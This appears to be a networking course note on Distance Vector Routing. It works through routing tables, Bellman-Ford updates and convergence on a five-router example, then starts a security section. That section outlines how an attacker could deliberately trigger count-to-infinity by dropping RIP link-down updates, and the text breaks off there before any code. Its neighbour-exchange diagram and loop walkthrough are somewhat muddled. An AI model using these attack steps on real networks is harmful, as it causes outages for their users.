# 📡 Distance Vector Routing (DVR) — Working & Methodology

### " "Networking Course — Network Layer

> **Source:** Gate Smashers — Distance Vector Routing
> **Exam Relevance:** GATE · UGC NET · University Exams · Interviews · CompTIA Security+ · CEH
> **Lab Environment:** Parrot OS + Metasploitable2 + Own MERN/PERN Projects

---

## 📑 Table of Contents

1. [What Is Distance Vector Routing?](#1-what-is-distance-vector-routing)
2. [The Network Topology Used in This Lesson](#2-the-network-topology-used-in-this-lesson)
3. [Routing Table Structure in DVR](#3-routing-table-structure-in-dvr)
4. [Two Fundamental Rules of DVR](#4-two-fundamental-rules-of-dvr)
5. [Step 1 — Build the Initial Local Routing Tables](#5-step-1--build-the-initial-local-routing-tables)
   - [5.1 N1's Initial Table](#51-n1s-initial-table)
   - [5.2 N2's Initial Table](#52-n2s-initial-table)
   - [5.3 N3's Initial Table](#53-n3s-initial-table)
   - [5.4 N4's Initial Table](#54-n4s-initial-table)
   - [5.5 N5's Initial Table](#55-n5s-initial-table)
   - [5.6 All Initial Tables Side by Side](#56-all-initial-tables-side-by-side)
6. [Step 2 — Share Distance Vectors with Neighbours](#6-step-2--share-distance-vectors-with-neighbours)
   - [6.1 What Is Shared and With Whom](#61-what-is-shared-and-with-whom)
   - [6.2 Who Receives What](#62-who-receives-what)
7. [Step 3 — Update Routing Tables (Pass 1)](#7-step-3--update-routing-tables-pass-1)
   - [7.1 N1's Updated Table — Worked Example](#71-n1s-updated-table--worked-example)
   - [7.2 N5's Updated Table — Worked Example](#72-n5s-updated-table--worked-example)
   - [7.3 Generalised Update Formula](#73-generalised-update-formula)
8. [Multiple Passes — Convergence](#8-multiple-passes--convergence)
   - [8.1 Why Multiple Passes Are Needed](#81-why-multiple-passes-are-needed)
   - [8.2 Final Converged Tables (Direct Calculation Method)](#82-final-converged-tables-direct-calculation-method)
   - [8.3 N4's Final Table — Direct Method Walkthrough](#83-n4s-final-table--direct-method-walkthrough)
9. [DVR Algorithm — Bellman-Ford Equation](#9-dvr-algorithm--bellman-ford-equation)
10. [Continuous Updates — Why DVR Never Truly Stops](#10-continuous-updates--why-dvr-never-truly-stops)
11. [Security Analysis — Attacking DVR](#11-security-analysis--attacking-dvr)
    - [11.1 Count-to-Infinity Exploit](#111-count-to-infinity-exploit)
    - [11.2 Fake Distance Vector Injection](#112-fake-distance-vector-injection)
    - [11.3 Replay Attack on Distance Vectors](#113-replay-attack-on-distance-vectors)
12. [🧪 Practical Labs](#12--practical-labs)
    - [Lab 1 — Simulate DVR with Python (Full Working Algorithm)](#lab-1--simulate-dvr-with-python-full-working-algorithm)
    - [Lab 2 — Capture RIP (DVR in Practice) with Wireshark](#lab-2--capture-rip-dvr-in-practice-with-wireshark)
    - [Lab 3 — Inject a Fake Distance Vector with Scapy](#lab-3--inject-a-fake-distance-vector-with-scapy)
    - [Lab 4 — Trigger Count-to-Infinity on a Live RIP Network](#lab-4--trigger-count-to-infinity-on-a-live-rip-network)
    - [Lab 5 — DVR vs Link State on Your Own Network](#lab-5--dvr-vs-link-state-on-your-own-network)
13. [Solved Examples](#13-solved-examples)
14. [Exam Cheat Sheet](#14-exam-cheat-sheet)

---

## 1. What Is Distance Vector Routing?

```
DISTANCE VECTOR ROUTING (DVR) — Definition:

  Category:   Intra-domain routing protocol (IGP)
  Scope:      WITHIN a single autonomous system (AS)
  Purpose:    Allow all routers inside the AS to share routing information
              with each other so each router can build an accurate,
              up-to-date routing table.
  Goal:       Enable packet forwarding along the MINIMUM COST / SHORTEST path.

  Why do routers need this?
    A router alone knows only about its DIRECTLY connected networks.
    To forward a packet toward a distant destination, it needs to know
    the cost of reaching that destination via each of its neighbours.
    DVR is the mechanism by which this knowledge is built and maintained.

  Real-world protocol that uses DVR:
    RIP — Routing Information Protocol (UDP port 520)
    IGRP — Interior Gateway Routing Protocol (Cisco, legacy)
    EIGRP — Enhanced IGRP (Cisco, hybrid — adds link-state features)

  Time period:
    DVR was developed and popularised in the 1980s.
    It was the first widely deployed dynamic routing mechanism.
    Its simplicity made it attractive; its weaknesses (count-to-infinity)
    eventually drove the development of Link State (OSPF).
```

---

## 2. The Network Topology Used in This Lesson

```
TOPOLOGY — 5 routers (N1–N5) connected by links with costs:

         1
   N1 ──────── N2
               │  \
             6 │   \ 3
               │    \
               N3    N5
               │    /
             2 │   / 4
               │  /
               N4

  Link costs:
  ┌────────────┬──────┐
  │ Link       │ Cost │
  ├────────────┼──────┤
  │ N1 — N2   │  1   │
  │ N2 — N3   │  6   │
  │ N2 — N5   │  3   │
  │ N3 — N4   │  2   │
  │ N4 — N5   │  4   │
  └────────────┴──────┘

  Adjacency list (who is whose neighbour):
  ┌──────┬──────────────────────┐
  │ Node │ Direct Neighbours    │
  ├──────┼──────────────────────┤
  │ N1   │ N2                   │
  │ N2   │ N1, N3, N5           │
  │ N3   │ N2, N4               │
  │ N4   │ N3, N5               │
  │ N5   │ N2, N4               │
  └──────┴──────────────────────┘

  IMPORTANT:
    "Cost" can represent ANY of the following depending on the network:
      → Hop count (number of routers to traverse)
      → Propagation delay (milliseconds)
      → Link bandwidth (inversely — lower BW = higher cost)
      → Administrative cost (manually assigned)
    In this example: treat cost as a generic numeric distance.
    The algorithm works identically regardless of what cost represents.
```

---

## 3. Routing Table Structure in DVR

```
Each router in DVR maintains a routing table with exactly THREE columns:

  ┌─────────────────┬──────────────────┬──────────────────────┐
  │  DESTINATION    │  DISTANCE        │  NEXT HOP            │
  ├─────────────────┼──────────────────┼──────────────────────┤
  │  Which node     │  Total cost to   │  Which directly      │
  │  am I trying    │  reach that      │  connected neighbour  │
  │  to reach?      │  destination     │  do I send to first? │
  └─────────────────┴──────────────────┴──────────────────────┘

  DESTINATION:
    Every router knows all N routers in the network exist.
    (DVR Rule #1: all routers know the total count of routers.)
    So every routing table has N rows — one per router.

  DISTANCE:
    The total cost to reach the destination from THIS router.
    Initially:
      → 0 if destination = self (no travel needed)
      → known cost if destination = direct neighbour
      → ∞ (infinity) if no direct link exists

  NEXT HOP:
    The immediate next router to send the packet to.
    Tells the router which interface to use.
    Initially:
      → Self if destination = self
      → The neighbour itself if destination = direct neighbour
      → Unknown (∞) if no direct link
```

---

## 4. Two Fundamental Rules of DVR

```
RULE 1 — Global router awareness:
  Every router in the network knows the TOTAL NUMBER of routers
  in the autonomous system BEFORE the algorithm begins.

  Why?
    Each routing table must have one row per router.
    Without knowing how many routers exist, the table cannot be built.

  How in practice?
    Provided by the network administrator at setup time,
    OR discovered through a network-wide discovery mechanism.

  Example:
    N4 knows: "There are 5 routers — N1, N2, N3, N4, N5"
    N4 builds a 5-row routing table from the start.

──────────────────────────────────────────────────────────────────────

RULE 2 — HELLO message for neighbour discovery:
  Each router sends HELLO messages out all its interfaces.
  Neighbouring routers respond.
  Result: each router learns WHICH routers it is directly connected to.

  Why?
    A router needs to know its neighbours before it can share
    distance vectors with them or measure link costs.

  What a HELLO exchange establishes:
    → Identity of each neighbour (which router is on that link)
    → Cost of the link to that neighbour (measured or configured)

  After HELLO completes:
    N4 knows: "N3 is my neighbour at cost 2. N5 is my neighbour at cost 4."
    This direct link cost is the SEED of the entire DVR computation.

  In RIP (real protocol):
    HELLO equivalent = periodic RIP REQUEST / RESPONSE messages
    Link cost in RIP = hop count (each link = 1 hop by default)
```

---

## 5. Step 1 — Build the Initial Local Routing Tables

The initial table is built using ONLY what each router can observe directly — its own identity (cost 0) and its direct neighbours (known link costs). Everything else is set to ∞.

### 5.1 N1's Initial Table

```
N1 is directly connected to: N2 (cost 1)
N1 has NO direct link to: N3, N4, N5

  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    0     │   N1     │  ← Self: always 0, next hop = self
  │ N2          │    1     │   N2     │  ← Direct neighbour, cost = 1
  │ N3          │    ∞     │   ?      │  ← No direct link — unknown
  │ N4          │    ∞     │   ?      │  ← No direct link — unknown
  │ N5          │    ∞     │   ?      │  ← No direct link — unknown
  └─────────────┴──────────┴──────────┘

  N1 knows about: itself and N2 ONLY.
  Everything else is a black hole at this stage.
```

---

### 5.2 N2's Initial Table

```
N2 is directly connected to: N1 (cost 1), N3 (cost 6), N5 (cost 3)
N2 has NO direct link to: N4

  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    1     │   N1     │  ← Direct neighbour, cost = 1
  │ N2          │    0     │   N2     │  ← Self
  │ N3          │    6     │   N3     │  ← Direct neighbour, cost = 6
  │ N4          │    ∞     │   ?      │  ← No direct link
  │ N5          │    3     │   N5     │  ← Direct neighbour, cost = 3
  └─────────────┴──────────┴──────────┘
```

---

### 5.3 N3's Initial Table

```
N3 is directly connected to: N2 (cost 6), N4 (cost 2)
N3 has NO direct link to: N1, N5

  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    ∞     │   ?      │  ← No direct link
  │ N2          │    6     │   N2     │  ← Direct neighbour, cost = 6
  │ N3          │    0     │   N3     │  ← Self
  │ N4          │    2     │   N4     │  ← Direct neighbour, cost = 2
  │ N5          │    ∞     │   ?      │  ← No direct link
  └─────────────┴──────────┴──────────┘
```

---

### 5.4 N4's Initial Table

```
N4 is directly connected to: N3 (cost 2), N5 (cost 4)
N4 has NO direct link to: N1, N2

  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    ∞     │   ?      │  ← No direct link
  │ N2          │    ∞     │   ?      │  ← No direct link
  │ N3          │    2     │   N3     │  ← Direct neighbour, cost = 2
  │ N4          │    0     │   N4     │  ← Self
  │ N5          │    4     │   N5     │  ← Direct neighbour, cost = 4
  └─────────────┴──────────┴──────────┘
```

---

### 5.5 N5's Initial Table

```
N5 is directly connected to: N2 (cost 3), N4 (cost 4)
N5 has NO direct link to: N1, N3

  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    ∞     │   ?      │  ← No direct link
  │ N2          │    3     │   N2     │  ← Direct neighbour, cost = 3
  │ N3          │    ∞     │   ?      │  ← No direct link
  │ N4          │    4     │   N4     │  ← Direct neighbour, cost = 4
  │ N5          │    0     │   N5     │  ← Self
  └─────────────┴──────────┴──────────┘
```

---

### 5.6 All Initial Tables Side by Side

```
INITIAL STATE — All 5 routing tables before any exchange:

  N1's Table          N2's Table          N3's Table
  ┌────┬────┬────┐    ┌────┬────┬────┐    ┌────┬────┬────┐
  │Dst │Dist│Nxt │    │Dst │Dist│Nxt │    │Dst │Dist│Nxt │
  ├────┼────┼────┤    ├────┼────┼────┤    ├────┼────┼────┤
  │ N1 │  0 │ N1 │    │ N1 │  1 │ N1 │    │ N1 │  ∞ │  ? │
  │ N2 │  1 │ N2 │    │ N2 │  0 │ N2 │    │ N2 │  6 │ N2 │
  │ N3 │  ∞ │  ? │    │ N3 │  6 │ N3 │    │ N3 │  0 │ N3 │
  │ N4 │  ∞ │  ? │    │ N4 │  ∞ │  ? │    │ N4 │  2 │ N4 │
  │ N5 │  ∞ │  ? │    │ N5 │  3 │ N5 │    │ N5 │  ∞ │  ? │
  └────┴────┴────┘    └────┴────┴────┘    └────┴────┴────┘

  N4's Table          N5's Table
  ┌────┬────┬────┐    ┌────┬────┬────┐
  │Dst │Dist│Nxt │    │Dst │Dist│Nxt │
  ├────┼────┼────┤    ├────┼────┼────┤
  │ N1 │  ∞ │  ? │    │ N1 │  ∞ │  ? │
  │ N2 │  ∞ │  ? │    │ N2 │  3 │ N2 │
  │ N3 │  2 │ N3 │    │ N3 │  ∞ │  ? │
  │ N4 │  0 │ N4 │    │ N4 │  4 │ N4 │
  │ N5 │  4 │ N5 │    │ N5 │  0 │ N5 │
  └────┴────┴────┘    └────┴────┴────┘

KEY OBSERVATION:
  At this point every router knows about its own node (cost 0)
  and its direct neighbours. Everything else is ∞.
  The network has NOT yet exchanged any information.
```

---

## 6. Step 2 — Share Distance Vectors with Neighbours

### 6.1 What Is Shared and With Whom

```
TWO CRITICAL RULES FOR SHARING:

  RULE A — Share with NEIGHBOURS ONLY:
    Do NOT broadcast to the whole network.
    Each router sends its distance vector ONLY to directly connected neighbours.
    N1 sends only to N2 (its only neighbour).
    N2 sends to N1, N3, and N5 (its three neighbours).

  RULE B — Share the DISTANCE VECTOR ONLY (not the full table):
    The routing table has 3 columns: Destination, Distance, Next Hop.
    What gets sent: ONLY the Distance column (the array of cost values).
    The Next Hop column is NOT shared — it is local information only.

    Why share only the distance vector?
    → Saves bandwidth — especially critical in the 1980s when this was designed
    → The receiving router only needs the COSTS, not the path decisions
    → The next hop is re-computed locally by the receiving router

  Distance vector = just the array of distances. Example for N2:
    [1, 0, 6, ∞, 3]
     ↑  ↑  ↑  ↑  ↑
    N1 N2 N3 N4 N5
    This array is what N2 sends to N1, N3, and N5.
```

---

### 6.2 Who Receives What

```
After the first sharing round — who receives which distance vectors:

  AT N1 — receives from:    N2 only
    Receives N2's vector:   [1, 0, 6, ∞, 3]

  AT N2 — receives from:    N1, N3, N5
    Receives N1's vector:   [0, 1, ∞, ∞, ∞]
    Receives N3's vector:   [∞, 6, 0, 2, ∞]
    Receives N5's vector:   [∞, 3, ∞, 4, 0]

  AT N3 — receives from:    N2, N4
    Receives N2's vector:   [1, 0, 6, ∞, 3]
    Receives N4's vector:   [∞, ∞, 2, 0, 4]

  AT N4 — receives from:    N3, N5
    Receives N3's vector:   [∞, 6, 0, 2, ∞]
    Receives N5's vector:   [∞, 3, ∞, 4, 0]

  AT N5 — receives from:    N2, N4
    Receives N2's vector:   [1, 0, 6, ∞, 3]
    Receives N4's vector:   [∞, ∞, 2, 0, 4]

  Visualised as arrows on the network:

       N1 ──────→ N2 ──────→ N1
                  │  ↙ ↗  │
                  ↓  N3   ↓
                  N3 ←── N2    (mutual exchange between neighbours)
                  │  ──→ N4
                  N4 ←── N3
                  │  ──→ N5
                  N5 ←── N4
                  │  ──→ N2
                  N2 ←── N5
```

---

## 7. Step 3 — Update Routing Tables (Pass 1)

### 7.1 N1's Updated Table — Worked Example

```
N1 received: N2's distance vector = [1, 0, 6, ∞, 3]
              (N2 to N1=1, N2 to N2=0, N2 to N3=6, N2 to N4=∞, N2 to N5=3)

CRITICAL RULE: When building the new routing table,
               DO NOT use the old routing table.
               Use ONLY the received distance vectors + known direct link costs.

N1's known direct link costs:
  N1 → N2 = 1    (from HELLO/initial setup)

FORMULA for each destination via each neighbour:
  New cost via neighbour v = (N1→v link cost) + (v's distance to destination)

─────────────────────────────────────────────────────────────────────────

DESTINATION N1 → N1:
  Cost = 0, Next = N1  (always, by definition)

─────────────────────────────────────────────────────────────────────────

DESTINATION N1 → N2:
  Via N2: (N1→N2 cost) + (N2→N2 from N2's vector)
        =     1        +         0
        = 1
  Only one neighbour (N2), so answer = 1, Next = N2

─────────────────────────────────────────────────────────────────────────

DESTINATION N1 → N3:
  Via N2: (N1→N2 cost) + (N2→N3 from N2's vector)
        =     1        +         6
        = 7
  Only one neighbour, so answer = 7, Next = N2

  Interpretation: "Go to N2 first (cost 1), then N2 will take you to N3 (cost 6)"

─────────────────────────────────────────────────────────────────────────

DESTINATION N1 → N4:
  Via N2: (N1→N2 cost) + (N2→N4 from N2's vector)
        =     1        +         ∞
        = ∞
  Answer = ∞, Next = ? (unknown)

  N2 doesn't know how to reach N4 yet → N1 still cannot reach N4.

─────────────────────────────────────────────────────────────────────────

DESTINATION N1 → N5:
  Via N2: (N1→N2 cost) + (N2→N5 from N2's vector)
        =     1        +         3
        = 4
  Answer = 4, Next = N2

─────────────────────────────────────────────────────────────────────────

N1's NEW Routing Table (after Pass 1):
  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    0     │   N1     │
  │ N2          │    1     │   N2     │
  │ N3          │    7     │   N2     │  ← Updated! Was ∞, now 7
  │ N4          │    ∞     │   ?      │  ← Still unknown
  │ N5          │    4     │   N2     │  ← Updated! Was ∞, now 4
  └─────────────┴──────────┴──────────┘

Progress: N1 now knows paths to N3 and N5 that it didn't know before.
N4 is still unreachable after pass 1 — N2 doesn't know about N4 yet.
```

---

### 7.2 N5's Updated Table — Worked Example

```
N5 received TWO distance vectors (two neighbours):
  From N2: [1, 0, 6, ∞, 3]    (N2→N1=1, N2→N2=0, N2→N3=6, N2→N4=∞, N2→N5=3)
  From N4: [∞, ∞, 2, 0, 4]    (N4→N1=∞, N4→N2=∞, N4→N3=2, N4→N4=0, N4→N5=4)

N5's known direct link costs:
  N5 → N2 = 3
  N5 → N4 = 4

For each destination: compute cost via N2 AND via N4, then take the MINIMUM.

─────────────────────────────────────────────────────────────────────────

DESTINATION N5 → N1:
  Via N2: (N5→N2) + (N2→N1) = 3 + 1 = 4
  Via N4: (N5→N4) + (N4→N1) = 4 + ∞ = ∞
  Minimum = 4, Next = N2   ← N4 doesn't know how to reach N1

─────────────────────────────────────────────────────────────────────────

DESTINATION N5 → N2:
  Via N2: (N5→N2) + (N2→N2) = 3 + 0 = 3
  Via N4: (N5→N4) + (N4→N2) = 4 + ∞ = ∞
  Minimum = 3, Next = N2

─────────────────────────────────────────────────────────────────────────

DESTINATION N5 → N3:
  Via N2: (N5→N2) + (N2→N3) = 3 + 6 = 9
  Via N4: (N5→N4) + (N4→N3) = 4 + 2 = 6
  Minimum = 6, Next = N4   ← Going via N4 is cheaper! (6 < 9)

─────────────────────────────────────────────────────────────────────────

DESTINATION N5 → N4:
  Via N2: (N5→N2) + (N2→N4) = 3 + ∞ = ∞
  Via N4: (N5→N4) + (N4→N4) = 4 + 0 = 4
  Minimum = 4, Next = N4

─────────────────────────────────────────────────────────────────────────

DESTINATION N5 → N5:
  Cost = 0, Next = N5  (self)

─────────────────────────────────────────────────────────────────────────

N5's NEW Routing Table (after Pass 1):
  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    4     │   N2     │  ← Updated! Was ∞
  │ N2          │    3     │   N2     │  ← Same as before (already knew)
  │ N3          │    6     │   N4     │  ← Updated! Was ∞, uses N4 not N2
  │ N4          │    4     │   N4     │  ← Same as before
  │ N5          │    0     │   N5     │  ← Self, unchanged
  └─────────────┴──────────┴──────────┘

Progress comparison for N5:
  BEFORE:  [∞, 3, ∞, 4, 0]   (knew only N2 and N4)
  AFTER:   [4, 3, 6, 4, 0]   (now knows paths to N1 and N3!)
  ∞ values were reduced by learning from neighbours' distance vectors.
```

---

### 7.3 Generalised Update Formula

```
BELLMAN-FORD EQUATION (the core of DVR):

  D(x, y) = min over all neighbours v of [ cost(x, v) + D(v, y) ]

  Where:
    D(x, y)      = cost of best known path from router x to destination y
    cost(x, v)   = the DIRECT LINK cost from router x to neighbour v
                   (this is always known and never changes unless link fails)
    D(v, y)      = cost from neighbour v to destination y
                   (this comes from v's received distance vector)

  PROCESS for router x updating its routing table entry for destination y:
    1. For each neighbour v:
         compute: cost(x, v) + D(v, y)
    2. Take the MINIMUM across all neighbours v
    3. That minimum = new D(x, y)
    4. The neighbour v that gave the minimum = new Next Hop for y

  SPECIAL CASES:
    → If y = x itself:          D(x, x) = 0, always. Next = x.
    → If cost(x,v) + D(v,y) = ∞ + anything = ∞  (infinity + anything = ∞)
    → Take minimum only among FINITE values when possible.
```

```
STEP-BY-STEP TEMPLATE for any update calculation:

  Router: Rx (the router we are updating)
  Destination: Dy (what we want to reach)
  Neighbour vectors received: V1=[...], V2=[...], ...

  For each neighbour Vi:
    candidate_cost = link_cost(Rx → Vi) + Vi's distance to Dy

  New distance to Dy = MIN(all candidate costs)
  New next hop to Dy = the neighbour Vi that gave the minimum

  If all candidate costs are ∞: still unreachable.
```

---

## 8. Multiple Passes — Convergence

### 8.1 Why Multiple Passes Are Needed

```
WHY ONE PASS IS NOT ENOUGH:

  In Pass 1:
    N1 learned from N2.
    N2 learned from N1, N3, N5.
    N4 learned from N3, N5.
    N5 learned from N2, N4.

  But N1's information has only propagated ONE hop:
    N1 → N2 ← only N2 knows N1's updated info after Pass 1

  In Pass 2:
    N2 shares N1's info with N3 and N5 (through N2's updated vector).
    N1's information now reaches: N3 and N5 (2 hops from N1).

  In Pass 3:
    N3 and N5 share what they learned (which includes N1's info) with N4.
    N1's information finally reaches N4 (3 hops from N1).

  General rule:
    After k passes: information has propagated at most k hops.
    For a network with diameter D (longest shortest path):
      DVR needs approximately D passes to converge fully.

  For our 5-node network (diameter = 3 hops: N1 → N2 → N3 → N4):
    Pass 1: direct neighbours know each other's costs
    Pass 2: 2-hop information propagates
    Pass 3: 3-hop information propagates (network converges)
    Pass 4: verification pass (no changes = CONVERGED)

  Convergence = when no routing table changes between passes.
  At convergence: every router has the globally optimal shortest paths.
```

```
INFORMATION PROPAGATION TRACE — N1's cost to N4:

  N1 to N4 = 3 hops (N1→N2→N3→N4, but through DVR exchanges):

  Pass 0 (initial):
    N1 knows: N4 = ∞
    N2 knows: N4 = ∞
    N3 knows: N4 = 2 (direct)
    N4 knows: N4 = 0 (self)

  Pass 1 (after first exchange):
    N3 shares its vector → N2 learns: N4 reachable at cost 6+2=8 via N3
    N5 shares its vector → N4 gets updated vectors
    N2 still sees N4 = ∞ in its FIRST pass vector (depends on order)
    N1 still sees N4 = ∞ (N2 didn't know yet when it sent to N1)

  Pass 2:
    N2 now knows N4 via N3 at cost 8 → sends to N1
    N1 learns: N4 = 1 + 8 = 9 via N2 ← first finite value!
    (But not yet optimal — better paths exist)

  Pass 3 (or later):
    N5 knows N4 = 4 (direct) → N2 learns N4 via N5 at cost 3+4=7
    N1 learns N4 via N2 = 1+7 = 8
    Better path: N1→N2→N5→N4 = 1+3+4 = 8  OR  N1→N2→N3→N4 = 1+6+2 = 9
    Final optimal: N4 = 8 via N2 (which internally routes via N5)
```

---

### 8.2 Final Converged Tables (Direct Calculation Method)

```
DIRECT METHOD — Computing final answers by inspecting the graph:

  Instead of running all passes step by step,
  you can compute the minimum cost path by tracing all possible routes.
  Useful for exams where time is limited.

  Method:
    1. List ALL simple paths between source and destination
    2. Sum up link costs along each path
    3. Pick the MINIMUM cost path
    4. The first hop on that path = Next Hop

  All pairs shortest paths for this topology:
  ┌──────┬──────┬──────────────────────────────────────┬──────┬──────────┐
  │ From │  To  │ All Paths (with costs)                │ Min  │ Next Hop │
  ├──────┼──────┼──────────────────────────────────────┼──────┼──────────┤
  │  N1  │  N2  │ N1→N2 = 1                            │  1   │   N2     │
  │  N1  │  N3  │ N1→N2→N3 = 1+6=7                    │  7   │   N2     │
  │      │      │ N1→N2→N5→N4→N3 = 1+3+4+2=10          │      │          │
  │  N1  │  N4  │ N1→N2→N3→N4 = 1+6+2=9               │  8   │   N2     │
  │      │      │ N1→N2→N5→N4 = 1+3+4=8                │      │          │
  │  N1  │  N5  │ N1→N2→N5 = 1+3=4                    │  4   │   N2     │
  │      │      │ N1→N2→N3→N4→N5 = 1+6+2+4=13          │      │          │
  ├──────┼──────┼──────────────────────────────────────┼──────┼──────────┤
  │  N4  │  N1  │ N4→N3→N2→N1 = 2+6+1=9               │  8   │   N5     │
  │      │      │ N4→N5→N2→N1 = 4+3+1=8                │      │          │
  │  N4  │  N2  │ N4→N3→N2 = 2+6=8                    │  7   │   N5     │
  │      │      │ N4→N5→N2 = 4+3=7                     │      │          │
  │  N4  │  N3  │ N4→N3 = 2                            │  2   │   N3     │
  │  N4  │  N5  │ N4→N5 = 4                            │  4   │   N5     │
  │      │      │ N4→N3→N2→N5 = 2+6+3=11               │      │          │
  └──────┴──────┴──────────────────────────────────────┴──────┴──────────┘
```

---

### 8.3 N4's Final Table — Direct Method Walkthrough

```
N4 FINAL CONVERGED TABLE — computed directly from the graph:

  DESTINATION N4 → N1:
    Path 1: N4 → N3 → N2 → N1  =  2 + 6 + 1  =  9
    Path 2: N4 → N5 → N2 → N1  =  4 + 3 + 1  =  8  ← MINIMUM
    Answer: 8, Next = N5

  DESTINATION N4 → N2:
    Path 1: N4 → N3 → N2        =  2 + 6  =  8
    Path 2: N4 → N5 → N2        =  4 + 3  =  7  ← MINIMUM
    Answer: 7, Next = N5

  DESTINATION N4 → N3:
    Path 1: N4 → N3             =  2  (direct link)
    (No better alternative)
    Answer: 2, Next = N3

  DESTINATION N4 → N4:
    Cost = 0, Next = N4  (self)

  DESTINATION N4 → N5:
    Path 1: N4 → N5             =  4  (direct link)
    Path 2: N4 → N3 → N2 → N5  =  2 + 6 + 3  =  11
    Answer: 4, Next = N5

  N4's FINAL Converged Routing Table:
  ┌─────────────┬──────────┬──────────┐
  │ Destination │ Distance │ Next Hop │
  ├─────────────┼──────────┼──────────┤
  │ N1          │    8     │   N5     │  ← Goes via N5 not N3 (8 < 9)
  │ N2          │    7     │   N5     │  ← Goes via N5 not N3 (7 < 8)
  │ N3          │    2     │   N3     │  ← Direct
  │ N4          │    0     │   N4     │  ← Self
  │ N5          │    4     │   N5     │  ← Direct
  └─────────────┴──────────┴──────────┘

  INTERESTING OBSERVATION:
    N4 reaches both N1 and N2 via N5 (not via N3, even though N3 is closer).
    This is because the N5→N2→N1 path is cheaper than N3→N2→N1.
    DVR correctly discovers this — it isn't obvious from just looking at the graph.
```

---

## 9. DVR Algorithm — Bellman-Ford Equation

```
BELLMAN-FORD — Complete Formal Algorithm:

  Input:
    n = number of routers
    c(x, y) = direct link cost from x to y (∞ if no direct link)
    D[v][y]  = distance vector received from neighbour v for destination y

  Algorithm executed at each router x:

  Initialise:
    for each destination y:
      if y == x:      D[x][y] = 0
      elif (x,y) are neighbours:  D[x][y] = c(x,y)
      else:           D[x][y] = ∞

  Send:
    Broadcast D[x][*] (just the distance array) to all neighbours.

  On receiving D[v][*] from neighbour v:
    for each destination y:
      new_cost = c(x, v) + D[v][y]
      if new_cost < D[x][y]:    ← Only update if we found something BETTER
        D[x][y] = new_cost
        next_hop[x][y] = v

  Repeat until no D[x][y] changes in a complete round.
  → Network has CONVERGED.

  TIME COMPLEXITY:
    O(n) passes to converge for a network with n routers.
    O(n²) total updates across the network per pass.
    Each router stores O(n) entries (one per destination).

  SPACE COMPLEXITY:
    O(n) per router (routing table has n entries).
    Much less than Link State which stores the full topology graph.
```

```
BELLMAN-FORD vs DIJKSTRA — Key Differences:

  ┌────────────────────────┬──────────────────────────┬──────────────────────────┐
  │ Property               │ Bellman-Ford (DVR)       │ Dijkstra (Link State)    │
  ├────────────────────────┼──────────────────────────┼──────────────────────────┤
  │ Algorithm type         │ Distributed              │ Centralised (local)      │
  │ Knowledge required     │ Only neighbours' vectors │ Full topology (LSDB)     │
  │ Number of rounds       │ Needs multiple passes    │ Single run at each router│
  │ Negative weight edges  │ Handles (with iteration) │ CANNOT handle            │
  │ Routing loops          │ Possible                 │ Impossible               │
  │ Information shared     │ Distance vectors         │ Link State Advertisements│
  │ Convergence speed      │ Slow (many rounds)       │ Fast (triggered, single) │
  │ Memory per router      │ O(n) — just the table    │ O(n²) — full topology    │
  │ Used in protocol       │ RIP                      │ OSPF, IS-IS              │
  └────────────────────────┴──────────────────────────┴──────────────────────────┘
```

---

## 10. Continuous Updates — Why DVR Never Truly Stops

```
DVR IS A CONTINUOUS PROCESS, NOT A ONE-TIME COMPUTATION:

  After convergence:
    All routing tables have optimal values.
    Routers still keep sending distance vectors periodically.
    In RIP: every 30 seconds (full distance vector to all neighbours).

  WHY continue after convergence?
    Networks are dynamic — topology changes constantly:
      → Link failure: a cable breaks, a router reboots
      → Link recovery: a repaired link comes back up
      → Cost change: administrator changes link weights
      → New router added: a new router joins the network
    When ANY of these happen: routers must RE-CONVERGE.

  WHEN A LINK FAILS:
    Example: N2-N3 link goes down.
    N2 immediately detects: cannot reach N3 directly.
    N2 updates its distance to N3 from 6 to ∞.
    N2 sends a TRIGGERED UPDATE immediately (doesn't wait 30 seconds).
    Triggered update propagates to all neighbours.
    All affected routers recalculate → find new paths if any exist.

  PERIODIC vs TRIGGERED UPDATES:
    Periodic:  Every 30s in RIP regardless of changes — slow but reliable
               Ensures neighbours know you're still alive (if you stop sending →
               neighbour marks your routes as invalid after 180s)
    Triggered: Sent IMMEDIATELY when topology changes — fast propagation
               Causes faster convergence when failures occur

  "CONVERGENCE" is a transient state, not a permanent one:
    Every topology change → starts a new convergence process.
    DVR networks are always converging toward, or have momentarily reached,
    a consistent state.

  The fundamental weakness:
    After a link failure, bad news propagates SLOWLY (count-to-infinity problem).
    Good news (new routes) propagates at update interval speed.
    OSPF (Link State) does NOT have this asymmetry — both good and bad
    news propagate equally fast via LSA flooding.
```

---

## 11. Security Analysis — Attacking DVR

> **Note:** All techniques are for educational purposes only. Test exclusively on your own Metasploitable2 VM, your own MERN/PERN web projects, or an isolated lab network you own and control.

### 11.1 Count-to-Infinity Exploit

```bash
# ──────────────────────────────────────────────────────────────────────────
# UNDERSTANDING: Count-to-Infinity as an Attack Vector
# ──────────────────────────────────────────────────────────────────────────
# Count-to-Infinity is usually discussed as a DVR weakness.
# An attacker can DELIBERATELY TRIGGER it to cause prolonged network outages.

# SCENARIO in our topology:
#   N2-N3 link breaks.
#   N3 marks N2 as ∞.
#   N4 knows N3 at cost 2 and thinks N3 can still reach N2 (stale info).
#   N4 sends N3: "I can reach N2 at cost 2+6=8 via N3 (stale)"
#   N3 thinks: "N4 can reach N2, let me use N4 at 2+8=10"
#   N4 gets N3's new vector: "N3 can reach N2 at 10" → 10+2=12
#   ... loop continues until both reach 16 (infinity in RIP)

# How an attacker can deliberately trigger this:
# 1. Position yourself on a subnet between two RIP routers
# 2. Intercept and DROP the update that announces "link is down"
